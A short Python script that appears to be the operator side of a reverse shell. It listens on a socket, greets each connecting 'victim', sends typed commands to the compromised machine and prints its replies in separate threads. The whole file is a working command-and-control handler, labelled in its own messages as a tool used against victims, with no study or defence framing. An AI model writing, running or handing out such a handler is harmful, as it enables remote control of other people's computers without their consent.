import os
import socket
import threading
from termcolor import colored


if __name__ == '__main__':
    
    class Shell:
        
        def __init__(self,host,port,limit):
            
            self.host = host
            self.port = port
            self.limit = limit
            
            
        def connect(self):
            sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            sock.bind((self.host,self.port))
            sock.listen(int(self.limit))
            print(colored("The victim is expected....",'green'))
            
            while True:
                
                try:
                    conn , addr = sock.accept()
                    print(colored(f'{addr[0]}:{addr[1]}','red'))
                    
                    def receivedData():
                        while True:
                            
                            try:
                                data = conn.recv(1024).decode('utf-8')
                                print(data)
                                
                            except ConnectionResetError:
                                print("Victim down...")
                                os._exit(0)
                    
                    
                    def sendData():
                        while True:
                            
                            try:
                                cmd = input('Shell#>')
                                cmd = cmd.strip()
                                conn.send(cmd.encode('utf-8'))
                            except KeyboardInterrupt:
                                print('Invalid command !')
                                break
                        
                    
                    t1 = threading.Thread(target=receivedData)
                    t2 = threading.Thread(target=sendData)
                    
                    t1.start()
                    t2.start()
                    
                    t1.join()
                    t2.join()
                    
                    
                except ConnectionError:
                    print('Bağlantı sağlanamadı.')
            
            
            
my_shell = Shell('localhost', 4242, 5)
my_shell.connect()
